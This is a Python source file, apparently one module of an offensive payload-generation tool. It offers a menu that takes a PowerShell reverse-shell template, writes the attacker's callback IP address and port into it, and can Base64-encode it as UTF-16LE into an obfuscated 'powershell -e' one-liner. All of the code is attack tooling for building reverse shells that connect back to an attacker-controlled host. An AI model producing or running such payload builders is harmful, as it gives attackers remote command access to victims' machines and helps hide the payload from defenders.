import os, base64, re

class ps_pl:
    def __init__(self, args, pl_path):
        self.args = args
        self.pl_path = pl_path

    def menu(self):
        print("\n--- Powershell Payload ---")
        print("1. Plain  [revshell.ps1]")
        print("2. Base64 [revshell.ps1]")
        choice = input(": ")
        if choice == "1":
            self.plain()
        elif choice == "2":
            self.b64()

    def plain(self):
        with open(f'{self.pl_path}revshell.ps1', "r") as file:
            powershell_script = file.read()
        powershell_script = re.sub(r'"(\d+\.\d+\.\d+\.\d+)"', f'"{self.args.lhost}"', powershell_script)
        powershell_script = re.sub(r'(\d+)(?=\))', f'{self.args.lport}', powershell_script)
        with open(f'{self.pl_path}revshell.ps1', "w") as file:
            file.write(powershell_script)
        os.system(f'cp {self.pl_path}revshell.ps1 .')

    def b64(self):
        with open(f'{self.pl_path}revshell.ps1', "r", encoding="utf-8") as f:
            script = f.read()
        utf16_bytes = script.encode('utf-16le')
        base64_encoded = base64.b64encode(utf16_bytes).decode('ascii')
        with open(f'{self.pl_path}b64_revshell.ps1', "w") as file:
            file.write(f'powershell -e {base64_encoded}')
        os.system(f'cp {self.pl_path}b64_revshell.ps1 .')